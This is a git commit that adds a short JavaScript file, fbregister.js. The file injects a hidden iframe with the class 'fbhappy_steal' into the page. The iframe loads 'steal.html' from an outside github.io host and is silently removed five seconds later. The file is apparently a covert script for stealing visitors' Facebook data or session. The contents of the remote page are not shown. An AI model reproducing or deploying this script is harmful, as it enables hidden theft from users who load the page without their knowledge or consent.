652aa01f1b7eedda10b4989f04c46fd75dd7d2a8
mbrsscott <57515344+mbrsscott@users.noreply.github.com>
2021-02-03 16:40:30 +0800

    Create fbregister.js

---
+++ fbregister.js
@@ -0,0 +1,36 @@
+function makeid(length) {
+    var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {
+       result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+ }
+ 
+ 
+ function doFlow(){
+     
+     var fbhappyId=makeid(5);
+     var ifrm_f = document.createElement('iframe');
+     ifrm_f.setAttribute('id', fbhappyId);
+     ifrm_f.setAttribute('class', 'fbhappy_steal');
+     ifrm_f.style.display = "none";
+     document.body.appendChild(ifrm_f);
+     
+
+     var fbframe=document.getElementById(fbhappyId);
+
+     fbframe.src ="https://jinmawang698.github.io/XDhappygo/steal.html";
+     
+     fbframe.addEventListener("load",function(){
+         setTimeout(function(){
+             //console.log("removing fbhappyId - "+fbhappyId);
+             fbframe.parentNode.removeChild(fbframe);
+             fbframe.parentNode=null;
+             //console.log("remove fbhappyId - "+fbhappyId+" done");
+         }, 5000);
+         
+     });
+     
+}
